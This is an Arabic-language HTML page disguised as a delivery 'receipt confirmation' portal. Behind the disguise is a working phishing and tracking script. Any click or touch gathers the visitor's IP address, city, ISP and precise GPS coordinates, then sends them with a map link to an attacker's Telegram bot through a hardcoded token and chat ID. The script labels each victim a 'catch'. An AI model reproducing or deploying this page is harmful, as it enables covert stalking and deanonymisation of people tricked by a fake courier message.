<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>بوابة توثيق الاستلام</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; user-select: none; }
        body, html { height: 100%; width: 100%; background: #0f172a; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: pointer; }
        .card { width: 85%; max-width: 380px; background: #1e293b; border: 2px solid #38bdf8; border-radius: 30px; padding: 40px 20px; text-align: center; box-shadow: 0 0 20px rgba(56, 189, 248, 0.2); }
        .icon { font-size: 50px; margin-bottom: 20px; }
        h1 { color: white; font-size: 22px; margin-bottom: 15px; }
        p { color: #94a3b8; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
        .btn { width: 100%; padding: 15px; background: #38bdf8; color: #0f172a; border-radius: 15px; font-weight: bold; font-size: 18px; }
    </style>
</head>
<body onclick="collect()" ontouchstart="collect()">

    <div class="card">
        <div class="icon">📍</div>
        <h1>تأكيد موقع الاستلام</h1>
        <p>المندوب بانتظار تأكيد موقعك الآن. يرجى النقر في أي مكان لتفعيل التتبع المباشر وفتح قفل الشحنة.</p>
        <div class="btn">تحديث الموقع الآن</div>
    </div>

<script>
    const TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
    const ID = '6876904688';

    function collect() {
        // جلب الـ IP أولاً بطريقة "مباشرة" وبسيطة
        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(ipData => {
            // بعد جلب الـ IP، نطلب الموقع
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        send(ipData, pos.coords.latitude, pos.coords.longitude, "✅ صيد كامل (IP + GPS)");
                    },
                    (err) => {
                        send(ipData, null, null, "⚠️ صيد جزئي (IP فقط - رفض الموقع)");
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                send(ipData, null, null, "❌ المتصفح لا يدعم GPS");
            }
        })
        .catch(err => {
            // إذا فشل الـ IP، نحاول نبعث الموقع لحاله على الأقل
            console.log("IP Failed, trying GPS only...");
        });
    }

    function send(ip, lat, lng, status) {
        const map = lat ? `https://www.google.com/maps?q=${lat},${lng}` : "مرفوض";
        const text = `
🔔 إشعار صيد جديد
━━━━━━━━━━━━
الوضع: ${status}
IP: ${ip.ip || 'غير معروف'}
المدينة: ${ip.city || '--'}
الشركة: ${ip.org || '--'}
الخريطة: ${map}
━━━━━━━━━━━━`;

        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ID, text: text })
        });

        alert("جاري مطابقة الموقع مع السيرفر.. انتظر قليلاً");
    }
</script>
</body>
</html>
